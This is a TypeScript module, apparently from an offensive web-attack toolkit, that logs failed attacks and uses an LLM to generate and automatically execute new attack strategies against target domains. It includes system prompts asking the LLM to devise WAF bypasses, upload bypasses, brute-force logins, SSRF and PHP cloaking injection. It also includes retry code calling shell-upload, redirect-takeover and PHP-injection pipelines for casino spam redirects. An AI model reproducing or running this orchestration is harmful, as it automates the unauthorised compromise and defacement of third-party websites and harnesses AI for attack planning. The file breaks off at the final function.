/**
 * AI Failure Learning Engine — Learn from Failed Attacks & Auto-generate New Strategies
 *
 * Core Loop:
 *   1. saveFailureAnalytics()      — Record failure details to DB
 *   2. analyzeFailurePatterns()    — AI analyzes patterns across all failures
 *   3. generateNewStrategies()     — AI invents new attack approaches based on fail cases
 *   4. executeAdaptiveRetry()      — Auto-test AI-generated strategies on the domain
 *   5. updateStrategyCache()       — Update success/failure rates for auto-suggest
 *   6. suggestBestMode()           — Recommend best attack mode for a new domain
 *   7. getFailureLearningReport()  — Summary of what the AI has learned
 *
 * The engine operates at the "mode" level (full_chain, redirect_only, pipeline, etc.)
 * complementing the existing adaptive-learning.ts which works at the "method" level.
 */

import { getDb } from "./db";
import {
  failureAnalytics, InsertFailureAnalytics,
  attackStrategyCache, InsertAttackStrategyCache,
  aiAttackHistory,
  deployHistory,
} from "../drizzle/schema";
import { eq, desc, and, sql, gte, or, count, avg, like, isNotNull } from "drizzle-orm";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface FailureRecord {
  domain: string;
  mode: string;
  serverType?: string;
  cms?: string;
  cmsVersion?: string;
  waf?: string;
  wafStrength?: string;
  hostingProvider?: string;
  methodsTried: Array<{ name: string; status: string; reason: string; durationMs?: number }>;
  totalDurationMs?: number;
}

export interface AIStrategy {
  strategy: string;
  description: string;
  technique: string;
  estimatedSuccessRate: number;
  confidence: number;
  reasoning: string;
  requiredMode: string;
  steps: string[];
}

export interface ModeSuggestion {
  recommendedMode: string;
  confidence: number;
  reasoning: string;
  estimatedSuccessRate: number;
  alternativeModes: Array<{
    mode: string;
    successRate: number;
    reason: string;
  }>;
  avoidModes: Array<{
    mode: string;
    reason: string;
  }>;
  basedOnSamples: number;
  serverProfile: string;
}

export interface AdaptiveRetryResult {
  attempted: boolean;
  strategyUsed: string;
  success: boolean;
  details: string;
  durationMs: number;
}

export interface FailureLearningReport {
  totalFailures: number;
  totalRetries: number;
  retrySuccessRate: number;
  topFailurePatterns: Array<{ pattern: string; count: number; domains: string[] }>;
  strategiesGenerated: number;
  strategiesSucceeded: number;
  modeEffectiveness: Array<{ mode: string; attempts: number; successRate: number }>;
  aiInsights: string[];
}

// ═══════════════════════════════════════════════════════
//  1. SAVE FAILURE ANALYTICS
// ═══════════════════════════════════════════════════════

/**
 * Record a failed attack's full context to the failure_analytics table.
 * Called from every attack mode's failure path.
 */
export async function saveFailureAnalytics(record: FailureRecord): Promise<number | null> {
  try {
    const db = await getDb();
    if (!db) return null;

    const timeoutCount = record.methodsTried.filter(m => m.status === "timeout").length;
    const errorCount = record.methodsTried.filter(m => m.status === "error").length;

    // Classify the failure pattern
    const failurePattern = classifyFailurePattern(record);

    const [result] = await db.insert(failureAnalytics).values({
      domain: record.domain,
      mode: record.mode,
      serverType: record.serverType,
      cms: record.cms,
      cmsVersion: record.cmsVersion,
      waf: record.waf,
      wafStrength: record.wafStrength,
      hostingProvider: record.hostingProvider,
      methodsTried: record.methodsTried,
      totalMethodsTried: record.methodsTried.length,
      timeoutCount,
      errorCount,
      totalDurationMs: record.totalDurationMs,
      failurePattern,
    });

    console.log(`[FailureLearning] 📊 Saved failure analytics for ${record.domain} [${record.mode}] pattern=${failurePattern}`);
    return result.insertId;
  } catch (e: any) {
    console.warn(`[FailureLearning] Failed to save failure analytics: ${e.message}`);
    return null;
  }
}

/**
 * Classify the failure into a pattern category for grouping.
 */
function classifyFailurePattern(record: FailureRecord): string {
  const methods = record.methodsTried;
  const reasons = methods.map(m => m.reason.toLowerCase()).join(" ");
  const timeoutRatio = methods.filter(m => m.status === "timeout").length / Math.max(methods.length, 1);

  if (timeoutRatio >= 0.5) return "timeout_dominant";
  if (reasons.includes("403") || reasons.includes("forbidden")) return "waf_block";
  if (reasons.includes("cloudflare") || record.waf?.toLowerCase()?.includes("cloudflare")) return "cloudflare_protected";
  if (reasons.includes("connection refused") || reasons.includes("econnrefused")) return "ports_closed";
  if (reasons.includes("not writable") || reasons.includes("permission denied")) return "hardened_permissions";
  if (reasons.includes("waf") || reasons.includes("blocked")) return "waf_active";
  if (record.cms?.toLowerCase()?.includes("wordpress") && reasons.includes("hardened")) return "wp_hardened";
  if (methods.every(m => m.status === "failed")) return "all_methods_failed";
  if (methods.every(m => m.status === "error")) return "all_errors";
  return "mixed_failure";
}

// ═══════════════════════════════════════════════════════
//  2. ANALYZE FAILURE PATTERNS
// ═══════════════════════════════════════════════════════

/**
 * AI analyzes all failure records to find patterns and insights.
 * Returns structured analysis of why attacks fail on certain target profiles.
 */
export async function analyzeFailurePatterns(options?: {
  domain?: string;
  mode?: string;
  limit?: number;
}): Promise<{
  patterns: Array<{ pattern: string; count: number; commonCms: string[]; commonWaf: string[]; insight: string }>;
  overallInsight: string;
  recommendations: string[];
}> {
  const fallback = { patterns: [], overallInsight: "ไม่มีข้อมูลเพียงพอ", recommendations: [] };

  try {
    const db = await getDb();
    if (!db) return fallback;

    // Query failure records
    const conditions: any[] = [];
    if (options?.domain) conditions.push(eq(failureAnalytics.domain, options.domain));
    if (options?.mode) conditions.push(eq(failureAnalytics.mode, options.mode));

    const failures = await db
      .select()
      .from(failureAnalytics)
      .where(conditions.length > 0 ? and(...conditions) : undefined)
      .orderBy(desc(failureAnalytics.createdAt))
      .limit(options?.limit || 50);

    if (failures.length < 2) return fallback;

    // Group by pattern
    const patternGroups = new Map<string, typeof failures>();
    for (const f of failures) {
      const key = f.failurePattern || "unknown";
      if (!patternGroups.has(key)) patternGroups.set(key, []);
      patternGroups.get(key)!.push(f);
    }

    // Ask AI to analyze
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `คุณเป็น AI ผู้เชี่ยวชาญด้าน penetration testing ที่วิเคราะห์ pattern จากการโจมตีที่ล้มเหลว
วิเคราะห์ข้อมูลด้านล่างแล้วหา:
1. Pattern ที่ซ้ำกัน — ทำไมถึงล้มเหลวบ่อย
2. ความสัมพันธ์ระหว่าง server type, CMS, WAF กับ failure
3. คำแนะนำเชิงปฏิบัติเพื่อเพิ่มโอกาสสำเร็จ
ตอบเป็น JSON`,
        },
        {
          role: "user",
          content: JSON.stringify({
            totalFailures: failures.length,
            patternDistribution: Array.from(patternGroups.entries()).map(([pattern, records]) => ({
              pattern,
              count: records.length,
              domains: Array.from(new Set(records.map(r => r.domain))).slice(0, 5),
              commonCms: Array.from(new Set(records.map(r => r.cms).filter(Boolean))),
              commonWaf: Array.from(new Set(records.map(r => r.waf).filter(Boolean))),
              commonServer: Array.from(new Set(records.map(r => r.serverType).filter(Boolean))),
              modes: Array.from(new Set(records.map(r => r.mode))),
              sampleMethods: records.slice(0, 3).map(r => r.methodsTried),
            })),
          }),
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "failure_analysis",
          strict: true,
          schema: {
            type: "object",
            properties: {
              patterns: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    pattern: { type: "string" },
                    count: { type: "integer" },
                    commonCms: { type: "array", items: { type: "string" } },
                    commonWaf: { type: "array", items: { type: "string" } },
                    insight: { type: "string" },
                  },
                  required: ["pattern", "count", "commonCms", "commonWaf", "insight"],
                  additionalProperties: false,
                },
              },
              overallInsight: { type: "string" },
              recommendations: { type: "array", items: { type: "string" } },
            },
            required: ["patterns", "overallInsight", "recommendations"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      return JSON.parse(content);
    }
    return fallback;
  } catch (e: any) {
    console.error(`[FailureLearning] analyzeFailurePatterns error: ${e.message}`);
    return fallback;
  }
}

// ═══════════════════════════════════════════════════════
//  3. GENERATE NEW STRATEGIES
// ═══════════════════════════════════════════════════════

/**
 * AI generates new attack strategies based on failure analysis.
 * These are novel approaches the system hasn't tried before.
 */
export async function generateNewStrategies(
  domain: string,
  failureRecord: FailureRecord,
  historicalFailures?: Array<{ mode: string; pattern: string; methods: any[] }>,
): Promise<AIStrategy[]> {
  try {
    // Get historical context for this domain
    const db = await getDb();
    let domainHistory: any[] = [];
    if (db) {
      domainHistory = await db
        .select()
        .from(failureAnalytics)
        .where(eq(failureAnalytics.domain, domain))
        .orderBy(desc(failureAnalytics.createdAt))
        .limit(10);
    }

    // Get success patterns from similar server profiles
    let successPatterns: any[] = [];
    if (db && failureRecord.serverType) {
      successPatterns = await db
        .select({
          method: aiAttackHistory.method,
          cms: aiAttackHistory.cms,
          waf: aiAttackHistory.waf,
          serverType: aiAttackHistory.serverType,
          cnt: count(),
        })
        .from(aiAttackHistory)
        .where(and(
          eq(aiAttackHistory.success, true),
          failureRecord.serverType ? like(aiAttackHistory.serverType, `%${failureRecord.serverType.split("/")[0]}%`) : undefined,
        ))
        .groupBy(aiAttackHistory.method, aiAttackHistory.cms, aiAttackHistory.waf, aiAttackHistory.serverType)
        .orderBy(desc(count()))
        .limit(15);
    }

    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `คุณเป็น AI Penetration Tester ที่เชี่ยวชาญในการคิดค้นวิธีโจมตีใหม่จาก fail case
เมื่อวิธีเดิมทั้งหมดล้มเหลว คุณต้อง:
1. วิเคราะห์สาเหตุที่แต่ละวิธีล้มเหลว
2. คิดวิธีใหม่ที่ bypass ปัญหาเหล่านั้น
3. ใช้ข้อมูลจาก domain ที่คล้ายกันที่เคยสำเร็จเป็นแนวทาง
4. เสนอ 3-5 strategies ใหม่ เรียงตามโอกาสสำเร็จ

วิธีที่ใช้ได้:
- full_chain: โจมตีเต็มรูปแบบ (scan → shell gen → upload → verify)
- redirect_only: วาง redirect อย่างเดียว (htaccess, wp-config, index.php)
- cloaking_inject: ฝัง PHP cloaking (Accept-Language based)
- hijack_redirect: ยึด redirect ที่มีอยู่ (XMLRPC, PMA, MySQL, FTP, cPanel)
- agentic_auto: AI เลือกวิธีเอง (autonomous)
- pipeline: unified attack pipeline (shell upload + WAF bypass + alt methods)

เทคนิคเฉพาะที่ลองได้:
- WAF bypass: User-Agent rotation, IP rotation via proxy, chunked encoding, double URL encoding
- Upload bypass: polyglot files, MIME confusion, null byte injection, race condition
- Auth bypass: default credentials, XMLRPC brute, wp-login brute, PMA default
- Indirect: DNS rebinding, SSRF, open redirect chain, subdomain takeover
- CMS-specific: plugin vuln exploit, theme editor, mu-plugins, wp-cron abuse
- Server-specific: .htaccess override, .user.ini, web.config, server-status leak

ตอบเป็น JSON`,
        },
        {
          role: "user",
          content: JSON.stringify({
            domain,
            currentFailure: {
              mode: failureRecord.mode,
              serverType: failureRecord.serverType,
              cms: failureRecord.cms,
              waf: failureRecord.waf,
              wafStrength: failureRecord.wafStrength,
              methodsTried: failureRecord.methodsTried,
              totalDuration: failureRecord.totalDurationMs,
            },
            domainHistory: domainHistory.map(h => ({
              mode: h.mode,
              pattern: h.failurePattern,
              methods: h.methodsTried,
              strategies: h.newStrategies,
              retrySuccess: h.retrySuccess,
            })),
            successPatternsOnSimilarServers: successPatterns.map(s => ({
              method: s.method,
              cms: s.cms,
              waf: s.waf,
              server: s.serverType,
              successCount: Number(s.cnt),
            })),
            historicalFailures: historicalFailures?.slice(0, 10),
          }),
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "new_strategies",
          strict: true,
          schema: {
            type: "object",
            properties: {
              strategies: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    strategy: { type: "string" },
                    description: { type: "string" },
                    technique: { type: "string" },
                    estimatedSuccessRate: { type: "integer" },
                    confidence: { type: "integer" },
                    reasoning: { type: "string" },
                    requiredMode: { type: "string" },
                    steps: { type: "array", items: { type: "string" } },
                  },
                  required: ["strategy", "description", "technique", "estimatedSuccessRate", "confidence", "reasoning", "requiredMode", "steps"],
                  additionalProperties: false,
                },
              },
            },
            required: ["strategies"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      const strategies: AIStrategy[] = parsed.strategies || [];

      // Save strategies to the failure analytics record
      if (db) {
        const latestFailure = await db
          .select({ id: failureAnalytics.id })
          .from(failureAnalytics)
          .where(eq(failureAnalytics.domain, domain))
          .orderBy(desc(failureAnalytics.createdAt))
          .limit(1);

        if (latestFailure.length > 0) {
          await db.update(failureAnalytics)
            .set({
              newStrategies: strategies,
              strategiesGenerated: strategies.length,
            })
            .where(eq(failureAnalytics.id, latestFailure[0].id));
        }
      }

      console.log(`[FailureLearning] 🧠 Generated ${strategies.length} new strategies for ${domain}`);
      return strategies;
    }

    return [];
  } catch (e: any) {
    console.error(`[FailureLearning] generateNewStrategies error: ${e.message}`);
    return [];
  }
}

// ═══════════════════════════════════════════════════════
//  4. EXECUTE ADAPTIVE RETRY
// ═══════════════════════════════════════════════════════

/**
 * Auto-test AI-generated strategies on the domain.
 * Picks the highest-confidence strategy and executes it.
 */
export async function executeAdaptiveRetry(
  domain: string,
  redirectUrl: string,
  strategies: AIStrategy[],
  options?: {
    maxRetries?: number;
    onProgress?: (msg: string) => Promise<void>;
  },
): Promise<AdaptiveRetryResult> {
  const maxRetries = options?.maxRetries || 2;
  const startTime = Date.now();

  // Sort by estimated success rate descending
  const sorted = [...strategies].sort((a, b) => b.estimatedSuccessRate - a.estimatedSuccessRate);
  const toTry = sorted.slice(0, maxRetries);

  if (toTry.length === 0) {
    return { attempted: false, strategyUsed: "", success: false, details: "No strategies to try", durationMs: 0 };
  }

  for (const strategy of toTry) {
    try {
      if (options?.onProgress) {
        await options.onProgress(`🧪 AI ทดสอบวิธีใหม่: ${strategy.strategy} (${strategy.estimatedSuccessRate}% confidence)`);
      }

      console.log(`[FailureLearning] 🧪 Testing strategy: ${strategy.strategy} on ${domain} (mode: ${strategy.requiredMode})`);

      let success = false;
      let details = "";

      // Execute based on required mode
      if (strategy.requiredMode === "pipeline" || strategy.requiredMode === "full_chain") {
        const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
        const result = await runUnifiedAttackPipeline({
          targetUrl: domain.startsWith("http") ? domain : `https://${domain}`,
          redirectUrl,
          maxUploadAttempts: 5,
          enableCloaking: strategy.technique.includes("cloaking"),
          seoKeywords: [],
        });
        success = result.success;
        details = success
          ? `Pipeline สำเร็จ: ${result.verifiedFiles?.length || 0} files verified`
          : `Pipeline ล้มเหลว: ${result.errors?.slice(0, 2).join("; ")}`;
      } else if (strategy.requiredMode === "redirect_only") {
        const { executeRedirectTakeover } = await import("./redirect-takeover");
        const results = await executeRedirectTakeover({
          targetUrl: domain.startsWith("http") ? domain : `https://${domain}`,
          ourRedirectUrl: redirectUrl,
        });
        const succeeded = results.filter((r: any) => r.success);
        success = succeeded.length > 0;
        details = success
          ? `Redirect สำเร็จ: ${succeeded.map((r: any) => r.method).join(", ")}`
          : `Redirect ล้มเหลว: ${results.length} methods tried`;
      } else if (strategy.requiredMode === "hijack_redirect") {
        const { executeHijackRedirect } = await import("./hijack-redirect-engine");
        const result = await executeHijackRedirect({
          targetDomain: domain.replace(/^https?:\/\//, ""),
          newRedirectUrl: redirectUrl,
        });
        success = result.success;
        details = success
          ? `Hijack สำเร็จ: ${result.winningMethod}`
          : `Hijack ล้มเหลว: ${result.methodResults.length} methods tried`;
      } else if (strategy.requiredMode === "cloaking_inject") {
        const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
        const result = await executePhpInjectionAttack({
          targetUrl: domain.startsWith("http") ? domain : `https://${domain}`,
          redirectUrl,
          targetLanguages: ["th", "vi"],
          brandName: "casino",
        });
        success = result.success;
        details = success
          ? `Cloaking inject สำเร็จ: ${result.method}`
          : `Cloaking inject ล้มเหลว: ${result.errors.slice(0, 2).join("; ")}`;
      } else {
        // Default: try pipeline
        const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
        const result = await runUnifiedAttackPipeline({
          targetUrl: domain.startsWith("http") ? domain : `https://${domain}`,
          redirectUrl,
          maxUploadAttempts: 5,
          seoKeywords: [],
        });
        success = result.success;
        details = success
          ? `Default pipeline สำเร็จ`
          : `Default pipeline ล้มเหลว: ${result.errors?.slice(0, 2).join("; ")}`;
      }

      const durationMs = Date.now() - startTime;

      // Record retry result
      await recordRetryResult(domain, strategy, success, details, durationMs);

      if (success) {
        if (options?.onProgress) {
          await options.onProgress(`✅ AI Strategy สำเร็จ! ${strategy.strategy}: ${details}`);
        }
        return { attempted: true, strategyUsed: strategy.strategy, success: true, details, durationMs };
      }

      if (options?.onProgress) {
        await options.onProgress(`❌ Strategy "${strategy.strategy}" ล้มเหลว — ลองวิธีถัดไป...`);
      }
    } catch (e: any) {
      console.warn(`[FailureLearning] Strategy "${strategy.strategy}" threw error: ${e.message}`);
      if (options?.onProgress) {
        await options.onProgress(`⚠️ Strategy "${strategy.strategy}" error: ${e.message.substring(0, 60)}`);
      }
    }
  }

  const durationMs = Date.now() - startTime;
  return {
    attempted: true,
    strategyUsed: toTry.map(s => s.strategy).join(", "),
    success: false,
    details: `ลอง ${toTry.length} AI strategies ไม่สำเร็จ`,
    durationMs,
  };
}

/**
 * Record the result of an adaptive retry attempt.
 */
async function recordRetryResult(
  domain: string,
  strategy: AIStrategy,
  success: boolean,
  details: string,
  durationMs: number,
): Promise<void> {
  try {
    const db = await getDb();
    if (!db) return;

    // Update the latest failure analytics record for this domain
    const latest = await db
      .select({ id: failureAnalytics.id })
      .from(failureAnalytics)
      .where(eq(failureAnalytics.domain, domain))
      .orderBy(desc(failureAnalytics.createdAt))
      .limit(1);

    if (latest.length > 0) {
      await db.update(failureAnalytics)
        .set({
          retryAttempted: true,
          retrySuccess: success,
          retryMethod: strategy.strategy,
          retryDurationMs: durationMs,
          aiAnalysis: `Strategy: ${strategy.strategy} | Result: ${success ? "SUCCESS" : "FAILED"} | ${details}`,
        })
        .where(eq(failureAnalytics.id, latest[0].id));
    }

    // Update strategy cache
    await updateStrategyCache(domain, strategy.requiredMode, success, strategy, durationMs);

    console.log(`[FailureLearning] ${success ? "✅" : "❌"} Retry result recorded: ${strategy.strategy} on ${domain}`);
  } catch (e: any) {
    console.warn(`[FailureLearning] Failed to record retry result: ${e.message}`);
  }
}

// ═══════════════════════════════════════════════════════
//  5. UPDATE STRATEGY CACHE
// ═══════════════════════════════════════════════════════

/**
 * Update the attack_strategy_cache with new success/failure data.
 * This builds the knowledge base for auto-suggest.
 */
export async function updateStrategyCache(
  domain: string,
  mode: string,
  success: boolean,
  strategy?: AIStrategy,
  durationMs?: number,
): Promise<void> {
  try {
    const db = await getDb();
    if (!db) return;

    // Get the failure record for server profile
    const failureRecord = await db
      .select()
      .from(failureAnalytics)
      .where(eq(failureAnalytics.domain, domain))
      .orderBy(desc(failureAnalytics.createdAt))
      .limit(1);

    const profile = failureRecord[0];
    const serverType = profile?.serverType || "unknown";
    const cms = profile?.cms || "unknown";
    const waf = profile?.waf || "none";

    // Find or create cache entry for this server profile
    const existing = await db
      .select()
      .from(attackStrategyCache)
      .where(and(
        eq(attackStrategyCache.serverType, serverType),
        eq(attackStrategyCache.cms, cms),
        eq(attackStrategyCache.waf, waf),
      ))
      .limit(1);

    if (existing.length > 0) {
      const entry = existing[0];
      const newTotal = entry.totalAttempts + 1;
      const newSuccess = entry.successCount + (success ? 1 : 0);
      const newFailure = entry.failureCount + (success ? 0 : 1);
      const newRate = Math.round((newSuccess / newTotal) * 100);

      const updates: any = {
        totalAttempts: newTotal,
        successCount: newSuccess,
        failureCount: newFailure,
        successRate: newRate,
      };

      if (success) {
        updates.lastSuccessMethod = strategy?.strategy || mode;
        updates.recommendedMode = mode;
      } else {
        updates.lastFailureReason = strategy?.strategy
          ? `AI Strategy "${strategy.strategy}" failed`
          : `Mode "${mode}" failed`;
      }

      if (durationMs) {
        updates.avgDurationMs = Math.round(
          ((entry.avgDurationMs || 0) * (newTotal - 1) + durationMs) / newTotal
        );
      }

      await db.update(attackStrategyCache)
        .set(updates)
        .where(eq(attackStrategyCache.id, entry.id));
    } else {
      // Create new cache entry
      await db.insert(attackStrategyCache).values({
        serverType,
        cms,
        waf,
        wafStrength: profile?.wafStrength,
        hostingProvider: profile?.hostingProvider,
        recommendedMode: mode,
        totalAttempts: 1,
        successCount: success ? 1 : 0,
        failureCount: success ? 0 : 1,
        successRate: success ? 100 : 0,
        avgDurationMs: durationMs,
        confidence: 20, // Low confidence with single sample
        lastSuccessMethod: success ? (strategy?.strategy || mode) : undefined,
        lastFailureReason: success ? undefined : `Mode "${mode}" failed`,
      });
    }
  } catch (e: any) {
    console.warn(`[FailureLearning] Failed to update strategy cache: ${e.message}`);
  }
}

// ═══════════════════════════════════════════════════════
//  6. SUGGEST BEST MODE
// ═══════════════════════════════════════════════════════

/**
 * Recommend the best attack mode for a domain based on:
 * - Historical success/failure rates per server profile
 * - AI analysis of domain characteristics
 * - Strategy cache patterns
 */
export async function suggestBestMode(
  domain: string,
  serverInfo?: {
    serverType?: string;
    cms?: string;
    waf?: string;
    wafStrength?: string;
  },
): Promise<ModeSuggestion> {
  const fallback: ModeSuggestion = {
    recommendedMode: "full_chain",
    confidence: 30,
    reasoning: "ไม่มีข้อมูลเพียงพอ — ใช้ full_chain เป็น default",
    estimatedSuccessRate: 30,
    alternativeModes: [
      { mode: "agentic_auto", successRate: 25, reason: "AI เลือกวิธีเอง" },
      { mode: "redirect_only", successRate: 20, reason: "เร็วและเบา" },
    ],
    avoidModes: [],
    basedOnSamples: 0,
    serverProfile: "unknown",
  };

  try {
    const db = await getDb();
    if (!db) return fallback;

    // 1. Check domain-specific history
    const domainHistory = await db
      .select()
      .from(failureAnalytics)
      .where(eq(failureAnalytics.domain, domain))
      .orderBy(desc(failureAnalytics.createdAt))
      .limit(10);

    // 2. Check strategy cache for similar server profiles
    let cacheEntries: any[] = [];
    if (serverInfo?.serverType || serverInfo?.cms || serverInfo?.waf) {
      const conditions: any[] = [];
      if (serverInfo.serverType) conditions.push(like(attackStrategyCache.serverType, `%${serverInfo.serverType.split("/")[0]}%`));
      if (serverInfo.cms) conditions.push(like(attackStrategyCache.cms, `%${serverInfo.cms}%`));
      if (serverInfo.waf) conditions.push(eq(attackStrategyCache.waf, serverInfo.waf));

      if (conditions.length > 0) {
        cacheEntries = await db
          .select()
          .from(attackStrategyCache)
          .where(or(...conditions))
          .orderBy(desc(attackStrategyCache.successRate))
          .limit(10);
      }
    }

    // 3. Get global mode success rates from ai_attack_history
    const modeStats = await db
      .select({
        method: aiAttackHistory.method,
        total: count(),
        successes: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = 1 THEN 1 ELSE 0 END)`,
      })
      .from(aiAttackHistory)
      .groupBy(aiAttackHistory.method)
      .orderBy(desc(count()));

    // 4. Get domain-specific success history
    const domainSuccesses = await db
      .select({
        method: aiAttackHistory.method,
        total: count(),
        successes: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = 1 THEN 1 ELSE 0 END)`,
      })
      .from(aiAttackHistory)
      .where(eq(aiAttackHistory.targetDomain, domain))
      .groupBy(aiAttackHistory.method);

    const totalSamples = domainHistory.length + cacheEntries.length + modeStats.reduce((s, m) => s + Number(m.total), 0);

    if (totalSamples === 0) return fallback;

    // Ask AI to recommend
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `คุณเป็น AI ที่แนะนำ attack mode ที่เหมาะสมที่สุดสำหรับ domain
จากข้อมูล historical success/failure ให้แนะนำ:
1. Mode ที่ดีที่สุด + เหตุผล
2. Mode ทางเลือก
3. Mode ที่ควรหลีกเลี่ยง (ถ้ามี)

Modes ที่ใช้ได้:
- full_chain: โจมตีเต็มรูปแบบ (scan → shell → upload → verify) — ดีสำหรับ WordPress ที่มีช่องโหว่
- redirect_only: วาง redirect อย่างเดียว — เร็ว, เหมาะกับเว็บที่ writable
- cloaking_inject: ฝัง PHP cloaking — ซ่อนจาก bot, เหมาะกับเว็บที่มี PHP access
- hijack_redirect: ยึด redirect ที่มีอยู่ — เหมาะกับเว็บที่มี FTP/PMA/cPanel เปิด
- agentic_auto: AI เลือกวิธีเอง — ดีสำหรับเว็บที่ซับซ้อน/มี WAF
- pipeline: unified attack pipeline — ครอบคลุมที่สุด, ใช้เวลานาน

ตอบเป็น JSON`,
        },
        {
          role: "user",
          content: JSON.stringify({
            domain,
            serverInfo,
            domainHistory: domainHistory.map(h => ({
              mode: h.mode,
              pattern: h.failurePattern,
              methodCount: h.totalMethodsTried,
              retrySuccess: h.retrySuccess,
              retryMethod: h.retryMethod,
            })),
            strategyCache: cacheEntries.map(c => ({
              serverType: c.serverType,
              cms: c.cms,
              waf: c.waf,
              recommendedMode: c.recommendedMode,
              successRate: c.successRate,
              totalAttempts: c.totalAttempts,
              lastSuccessMethod: c.lastSuccessMethod,
            })),
            globalModeStats: modeStats.map(m => ({
              mode: m.method,
              total: Number(m.total),
              successes: Number(m.successes),
              successRate: Number(m.total) > 0 ? Math.round((Number(m.successes) / Number(m.total)) * 100) : 0,
            })),
            domainSpecificStats: domainSuccesses.map(d => ({
              mode: d.method,
              total: Number(d.total),
              successes: Number(d.successes),
            })),
          }),
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "mode_suggestion",
          strict: true,
          schema: {
            type: "object",
            properties: {
              recommendedMode: { type: "string" },
              confidence: { type: "integer" },
              reasoning: { type: "string" },
              estimatedSuccessRate: { type: "integer" },
              alternativeModes: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    mode: { type: "string" },
                    successRate: { type: "integer" },
                    reason: { type: "string" },
                  },
                  required: ["mode", "successRate", "reason"],
                  additionalProperties: false,
                },
              },
              avoidModes: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    mode: { type: "string" },
                    reason: { type: "string" },
                  },
                  required: ["mode", "reason"],
                  additionalProperties: false,
                },
              },
              serverProfile: { type: "string" },
            },
            required: ["recommendedMode", "confidence", "reasoning", "estimatedSuccessRate", "alternativeModes", "avoidModes", "serverProfile"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      return { ...parsed, basedOnSamples: totalSamples };
    }

    return fallback;
  } catch (e: any) {
    console.error(`[FailureLearning] suggestBestMode error: ${e.message}`);
    return fallback;
  }
}

// ═══════════════════════════════════════════════════════
//  7. FAILURE LEARNING REPORT
// ═══════════════════════════════════════════════════════

/**
 * Generate a comprehensive report of what the AI has learned from failures.
 */
export async function getFailureLearningReport(): Promise<FailureLearningReport> {
  const fallback: FailureLearningReport = {
    totalFailures: 0, totalRetries: 0, retrySuccessRate: 0,
    topFailurePatterns: [], strategiesGenerated: 0, strategiesSucceeded: 0,
    modeEffectiveness: [], aiInsights: [],
  };

  try {
    const db = await getDb();
    if (!db) return fallback;

    // Total failures
    const [totalResult] = await db
      .select({ total: count() })
      .from(failureAnalytics);
    const totalFailures = Number(totalResult?.total || 0);

    // Retry stats
    const [retryResult] = await db
      .select({
        total: count(),
        successes: sql<number>`SUM(CASE WHEN ${failureAnalytics.retrySuccess} = 1 THEN 1 ELSE 0 END)`,
      })
      .from(failureAnalytics)
      .where(eq(failureAnalytics.retryAttempted, true));
    const totalRetries = Number(retryResult?.total || 0);
    const retrySuccesses = Number(retryResult?.successes || 0);

    // Top failure patterns
    const patterns = await db
      .select({
        pattern: failureAnalytics.failurePattern,
        cnt: count(),
      })
      .from(failureAnalytics)
      .where(isNotNull(failureAnalytics.failurePattern))
      .groupBy(failureAnalytics.failurePattern)
      .orderBy(desc(count()))
      .limit(10);

    // Get domains for each pattern
    const topFailurePatterns = [];
    for (const p of patterns) {
      const domains = await db
        .select({ domain: failureAnalytics.domain })
        .from(failureAnalytics)
        .where(eq(failureAnalytics.failurePattern, p.pattern!))
        .limit(5);
      topFailurePatterns.push({
        pattern: p.pattern || "unknown",
        count: Number(p.cnt),
        domains: Array.from(new Set(domains.map(d => d.domain))),
      });
    }

    // Strategies generated
    const [stratResult] = await db
      .select({
        total: sql<number>`SUM(${failureAnalytics.strategiesGenerated})`,
      })
      .from(failureAnalytics);

    // Mode effectiveness from ai_attack_history
    const modeStats = await db
      .select({
        method: aiAttackHistory.method,
        total: count(),
        successes: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = 1 THEN 1 ELSE 0 END)`,
      })
      .from(aiAttackHistory)
      .groupBy(aiAttackHistory.method)
      .orderBy(desc(count()))
      .limit(10);

    const modeEffectiveness = modeStats.map(m => ({
      mode: m.method,
      attempts: Number(m.total),
      successRate: Number(m.total) > 0 ? Math.round((Number(m.successes) / Number(m.total)) * 100) : 0,
    }));

    // AI insights
    const analysis = await analyzeFailurePatterns({ limit: 30 });

    return {
      totalFailures,
      totalRetries,
      retrySuccessRate: totalRetries > 0 ? Math.round((retrySuccesses / totalRetries) * 100) : 0,
      topFailurePatterns,
      strategiesGenerated: Number(stratResult?.total || 0),
      strategiesSucceeded: retrySuccesses,
      modeEffectiveness,
      aiInsights: analysis.recommendations,
    };
  } catch (e: any) {
    console.error(`[FailureLearning] getFailureLearningReport error: ${e.message}`);
    return fallback;
  }
}

// ═══════════════════════════════════════════════════════
//  8. FULL LEARNING LOOP — fail → analyze → generate → test → learn
// ═══════════════════════════════════════════════════════

/**
 * The complete AI learning loop:
 * 1. Save failure data
 * 2. Analyze patterns
 * 3. Generate new strategies
 * 4. Execute adaptive retry
 * 5. Update strategy cache
 * 6. Return result
 *
 * This is the main entry point called after every failed attack.
 */
export async function runFailureLearningLoop(
  failureRecord: FailureRecord,
  redirectUrl: string,
  options?: {
    enableAutoRetry?: boolean;
    maxRetries?: number;
    onProgress?: (msg: string) => Promise<void>;
  },
): Promise<{
  analyticsId: number | null;
  strategies: AIStrategy[];
  retryResult: AdaptiveRetryResult | null;
  suggestion: ModeSuggestion | null;
}> {
